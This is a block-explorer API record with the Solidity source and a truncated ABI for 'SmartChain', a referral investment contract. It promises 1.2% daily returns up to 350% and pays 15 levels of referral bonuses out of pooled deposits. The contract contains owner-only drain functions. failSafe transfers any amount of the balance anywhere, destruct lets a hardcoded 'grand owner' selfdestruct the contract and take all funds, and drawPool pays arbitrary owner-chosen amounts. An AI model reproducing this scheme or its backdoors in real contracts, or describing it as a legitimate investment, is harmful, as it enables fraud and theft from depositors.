{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity 0.5.16;\r\n\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\n contract Context {\r\n    function _msgSender() internal view  returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view  returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () internal {\r\n        address msgSender = 0x7c80b1747FbC797f89ec959E34BFF714668B568C;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public  onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public  onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\n\r\n/**\r\n * @dev Contract module which allows children to implement an emergency stop\r\n * mechanism that can be triggered by an authorized account.\r\n *\r\n * This module is used through inheritance. It will make available the\r\n * modifiers `whenNotPaused` and `whenPaused`, which can be applied to\r\n * the functions of your contract. Note that they will not be pausable by\r\n * simply including this module, only once the modifiers are put in place.\r\n */\r\ncontract Pausable is Context {\r\n    /**\r\n     * @dev Emitted when the pause is triggered by `account`.\r\n     */\r\n    event Paused(address account);\r\n\r\n    /**\r\n     * @dev Emitted when the pause is lifted by `account`.\r\n     */\r\n    event Unpaused(address account);\r\n\r\n    bool private _paused;\r\n\r\n    /**\r\n     * @dev Initializes the contract in unpaused state.\r\n     */\r\n    constructor () internal {\r\n        _paused = false;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns true if the contract is paused, and false otherwise.\r\n     */\r\n    function paused() public view returns (bool) {\r\n        return _paused;\r\n    }\r\n\r\n    /**\r\n     * @dev Modifier to make a function callable only when the contract is not paused.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must not be paused.\r\n     */\r\n    modifier whenNotPaused() {\r\n        require(!_paused, \"Pausable: paused\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Modifier to make a function callable only when the contract is paused.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must be paused.\r\n     */\r\n    modifier whenPaused() {\r\n        require(_paused, \"Pausable: not paused\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Triggers stopped state.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must not be paused.\r\n     */\r\n    function _pause() internal  whenNotPaused {\r\n        _paused = true;\r\n        emit Paused(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Returns to normal state.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The contract must be paused.\r\n     */\r\n    function _unpause() internal  whenPaused {\r\n        _paused = false;\r\n        emit Unpaused(_msgSender());\r\n    }\r\n}\r\n\r\n\r\ncontract Destructible {\r\n    address payable public grand_owner;\r\n\r\n    event GrandOwnershipTransferred(address indexed previous_owner, address indexed new_owner);\r\n\r\n    constructor() public {\r\n        grand_owner = 0x7c80b1747FbC797f89ec959E34BFF714668B568C;\r\n    }\r\n\r\n    function transferGrandOwnership(address payable _to) external {\r\n        require(msg.sender == grand_owner, \"Access denied (only grand owner)\");\r\n        \r\n        grand_owner = _to;\r\n    }\r\n\r\n    function destruct() external {\r\n        require(msg.sender == grand_owner, \"Access denied (only grand owner)\");\r\n\r\n        selfdestruct(grand_owner);\r\n    }\r\n}\r\n\r\ncontract SmartChain is Ownable, Destructible, Pausable {\r\n    \r\n    struct User { // user struct\r\n        uint256 cycle; // deposit cycles\r\n        address upline; // referrer\r\n        uint256 referrals; // referrals count\r\n        mapping(uint256 => uint256) payouts; // payout of deposits by cycle\r\n        uint256 direct_bonus; // referral bonus\r\n        uint256 match_bonus; // matching bonus\r\n        mapping(uint256 => uint256) deposit_amount; // deposit amount by cycle\r\n        uint256 currentCycle; // current deposit cycle\r\n        mapping(uint256 => uint256) deposit_payouts;  // deposit payout by cycle\r\n        mapping(uint256 => uint256) deposit_time; // deposit time by cycle\r\n        uint256 total_deposits; // total deposits\r\n        uint256 total_payouts; // total payout received\r\n        uint256 total_structure; // total upline structures\r\n    }\r\n\r\n    mapping(address => User) public users;\r\n    \r\n    address maintenance_address; // maintainence address\r\n    address investor_address; // investor address\r\n\r\n    uint8[] public ref_bonuses;  // upline bonuses\r\n\r\n     uint minimum_deposit = 0.0001 ether;\r\n    \r\n    // pools money\r\n    uint public general_pool_amount; // daily distribution pool\r\n    uint public referrals_pool_amount; // matching bonus pool\r\n    uint public investor_pool_amount; // investor pool\r\n    uint public sponser_pool_amount; // top sponsers pool\r\n    \r\n    // pools percentage\r\n    uint public general_pool = 69 ether; // 69%\r\n    uint public referrals_pool = 15 ether; // 15%\r\n    uint public investor_pool = 5 ether; // 5%\r\n    uint public sponser_pool = 5 ether; // 5%\r\n    \r\n\r\n    uint40 public pool_last_draw = uint40(block.timestamp);\r\n    uint256 public pool_cycle; // pool cycles\r\n\r\n    uint256 public total_withdraw; // total withdrawal amount\r\n    \r\n    event Upline(address indexed addr, address indexed upline, uint _time);\r\n    event NewDeposit(address indexed addr, uint256 amount, uint _time);\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount, uint _time);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount, uint _time);\r\n    event PoolPayout(address indexed addr, uint256 amount, uint _time);\r\n    event Withdraw(address indexed addr, uint256 amount, uint _time);\r\n    event LimitReached(address indexed addr, uint256 amount, uint _time);\r\n\r\n    constructor() public {\r\n        maintenance_address  = 0x73998BDa8A923aDa963C7b2fca0F25f2B2100ee4;\r\n        investor_address = 0x25a05c48e4059a4A15cA01f8087f383CF3d4f880;\r\n        \r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(2);\r\n        ref_bonuses.push(2);\r\n        ref_bonuses.push(2);\r\n        ref_bonuses.push(2);\r\n        ref_bonuses.push(2);\r\n    }\r\n\r\n\r\n    function _setUpline(address _addr, address _upline) private { // set 15 generation\r\n        if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time[0] > 0 || _upline == owner())) { \r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline, now);\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].total_structure++;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {  // user deposit and pool money distribution\r\n        require(users[_addr].upline != address(0) || _addr == owner(), \"No upline\");\r\n\r\n        if(users[_addr].cycle > 0) {\r\n            \r\n            require(_amount >= users[_addr].deposit_amount[users[_addr].cycle-1], \"Deposit must be greather than the previous one\");\r\n        }\r\n        else require(_amount >= minimum_deposit, \"Bad amount\");\r\n        \r\n        users[_addr].deposit_amount[users[_addr].cycle] = _amount; // deposit to current cycle.\r\n        users[_addr].deposit_time[users[_addr].cycle] = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n        \r\n        users[_addr].cycle++;\r\n        \r\n        emit NewDeposit(_addr, _amount, now);\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount / 10; // upline 10 %\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr, _amount / 10, now);\r\n        }\r\n        \r\n        general_pool_amount += _amount*general_pool/(100 ether); // 69% - general pool\r\n        referrals_pool_amount += _amount*referrals_pool/(100 ether); // 15% - referral pool\r\n        investor_pool_amount += _amount*investor_pool/(100 ether); // 5% - invest pool\r\n        sponser_pool_amount += _amount*sponser_pool/(100 ether); // 5% - sponser pool\r\n\r\n        address(uint160(owner())).transfer(_amount*(5 ether) / (100 ether)); // owner commission 5 %;\r\n        address(uint160(maintenance_address)).transfer(_amount / 100); // maintainence 1 %;\r\n    }\r\n\r\n\r\n\r\n    function _refPayout(address _addr, uint256 _amount) private { // matching bonus distribution\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n            \r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n                users[up].match_bonus += bonus;\r\n                emit MatchPayout(up, _addr, bonus, now);  \r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n\r\n    function _drawPool(address [] memory _user_address, uint[] memory _user_amount) private { // sponser pool distribution\r\n        require(_user_address.length == _user_amount.length,\"invalid length\");\r\n        \r\n        pool_cycle++;\r\n        \r\n        pool_last_draw = uint40(block.timestamp);\r\n\r\n        for(uint8 i = 0; i < _user_address.length; i++) {\r\n            if(_user_address[i] == address(0)) break;\r\n                \r\n                if(users[_user_address[i]].deposit_time[0] > 0){\r\n                   uint max_payout = this.maxPayoutOf(users[_user_address[i]].deposit_amount[users[_user_address[i]].currentCycle]);\r\n                   if(_user_amount[i] > max_payout){\r\n                        _user_amount[i] = max_payout - users[_user_address[i]].payouts[users[_user_address[i]].currentCycle];\r\n                   }    \r\n                   \r\n                   users[_user_address[i]].payouts[users[_user_address[i]].currentCycle] +=_user_amount[i];\r\n                   \r\n                   if(users[_user_address[i]].payouts[users[_user_address[i]].currentCycle] >= max_payout && _user_amount[i] > 0) {\r\n                        users[_user_address[i]].currentCycle++;\r\n                        emit LimitReached(_user_address[i], users[_user_address[i]].payouts[users[_user_address[i]].currentCycle], now);\r\n                    }\r\n                   \r\n                   emit Withdraw(_user_address[i], _user_amount[i], now);\r\n                }\r\n                \r\n                if(sponser_pool_amount < _user_amount[i]) break;\r\n                \r\n                require(address(uint160(_user_address[i])).send(_user_amount[i]),\"transfer failed\");\r\n                sponser_pool_amount -= _user_amount[i];\r\n                \r\n                emit PoolPayout(_user_address[i], _user_amount[i], now);\r\n        }\r\n    }\r\n\r\n    function deposit(address _upline) payable external whenNotPaused {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function withdraw() external whenNotPaused {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n        \r\n        require(users[msg.sender].payouts[users[msg.sender].currentCycle] < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts[users[msg.sender].currentCycle] + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts[users[msg.sender].currentCycle];\r\n            }\r\n            \r\n            if(general_pool_amount < to_payout) to_payout=general_pool_amount;\r\n            \r\n            users[msg.sender].deposit_payouts[users[msg.sender].currentCycle] += to_payout;\r\n            users[msg.sender].payouts[users[msg.sender].currentCycle] += to_payout;\r\n            general_pool_amount -= to_payout;\r\n    \r\n            if(to_payout > 0)\r\n                _refPayout(msg.sender, to_payout);\r\n        }\r\n        \r\n        // Direct payout\r\n        if(users[msg.sender].payouts[users[msg.sender].currentCycle] < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts[users[msg.sender].currentCycle] + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts[users[msg.sender].currentCycle];\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts[users[msg.sender].currentCycle] += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        }\r\n\r\n        // Match payout\r\n        if(users[msg.sender].payouts[users[msg.sender].currentCycle] < max_payout && users[msg.sender].match_bonus > 0) {\r\n            uint256 match_bonus = users[msg.sender].match_bonus;\r\n\r\n            if(users[msg.sender].payouts[users[msg.sender].currentCycle] + match_bonus > max_payout) {\r\n                match_bonus = max_payout - users[msg.sender].payouts[users[msg.sender].currentCycle];\r\n            }\r\n            \r\n            if(referrals_pool_amount < match_bonus) match_bonus=referrals_pool_amount;\r\n\r\n            users[msg.sender].match_bonus -= match_bonus;\r\n            users[msg.sender].payouts[users[msg.sender].currentCycle] += match_bonus;\r\n            referrals_pool_amount -= match_bonus;\r\n            to_payout += match_bonus;\r\n            \r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n        \r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n\r\n        address(uint160(msg.sender)).transfer(to_payout);\r\n\r\n        emit Withdraw(msg.sender, to_payout, now);\r\n\r\n        if(users[msg.sender].payouts[users[msg.sender].currentCycle] >= max_payout) {\r\n            users[msg.sender].currentCycle++;\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts[users[msg.sender].currentCycle], now);\r\n        }\r\n    }\r\n    \r\n    function drawPool(address[] calldata _user_address, uint[] calldata _user_amount) external onlyOwner {\r\n        _drawPool(_user_address, _user_amount);\r\n    }\r\n    \r\n    function investorWithdrawal(address payable _toUser, uint _amount) external returns(bool){\r\n        require(investor_pool_amount >= _amount,\"insufficient investor pool amount\");\r\n        require(_toUser != address(0),\"invalid address\");\r\n        require(msg.sender == investor_address,\"only investor wallet\");\r\n        \r\n        require(_toUser.send(_amount),\"transfer failed\");\r\n        investor_pool_amount -= _amount;\r\n    }\r\n    \r\n    function failSafe(address payable _toUser, uint _amount) external onlyOwner returns (bool) {\r\n        require(_toUser != address(0), \"Invalid Address\");\r\n        require(address(this).balance >= _amount, \"Insufficient balance\");\r\n\r\n        (_toUser).transfer(_amount);\r\n        return true;\r\n    }\r\n    \r\n    function pause() external onlyOwner {\r\n        _pause();\r\n    }\r\n    \r\n    function unpause() external onlyOwner {\r\n        _unpause();\r\n    }\r\n\r\n    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {\r\n        return _amount * 35 / 10; // maximum payout is set to 350 %\r\n    }\r\n\r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) { // 1.2 daily ROI\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount[users[_addr].currentCycle]);\r\n\r\n        if(users[_addr].deposit_payouts[users[msg.sender].currentCycle] < max_payout) {\r\n            payout = ((users[_addr].deposit_amount[users[_addr].currentCycle]*(1.2 ether)/(100 ether)) * ((block.timestamp - users[_addr].deposit_time[users[msg.sender].currentCycle]) / 1 days)) - users[_addr].deposit_payouts[users[msg.sender].currentCycle];\r\n            \r\n            if(users[_addr].deposit_payouts[users[_addr].currentCycle] + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts[users[_addr].currentCycle];\r\n            }\r\n            \r\n        }\r\n    }\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n    function userInfo(address _addr,uint256 _cycle) view external returns(address upline, uint256 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus) {\r\n        return (users[_addr].upline, users[_addr].deposit_time[_cycle], users[_addr].deposit_amount[_cycle], users[_addr].payouts[_cycle], users[_addr].direct_bonus);\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw) {\r\n        return (total_withdraw, pool_last_draw);\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"DirectPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previous_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"new_owner\",\"type\":\"address\"}],\"name\":\"GrandOwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"LimitReached\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"MatchPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Paused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"PoolPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"Unpaused\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"Upline\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_time\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_total_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"_pool_last_draw\",\"type\":\"uint40\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"destruct\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"_user_address\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_user_amount\",\"type\":\"uint256[]\"}],\"name\":\"drawPool\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_toUser\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"failSafe\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"general_pool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"general_pool_amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"grand_owner\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_toUser\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"investorWithdrawal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investor_pool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"investor_pool_amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"maxPayoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"pure\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"pause\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"paused\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"payoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"payout\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"max_payout\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"pool_cycle\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"pool_last_draw\",\"outputs\":[{\"internalType\":\"uint40\",\"name\":\"\",\"type\":\"uint40\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"referrals_pool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"referrals_pool_amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"sponser_pool\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"sponser_pool_amount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"total_withdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"transferGrandOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"unpause\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_cycle\",\"type\":\"uint256\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"deposit_time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deposit_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"direct_bonus\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfoTotals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"referrals\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_deposits\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_structure\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"cycle\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referrals\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"direct_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"match_bonus\",\"type\":\"uint256\"},{\"internalTy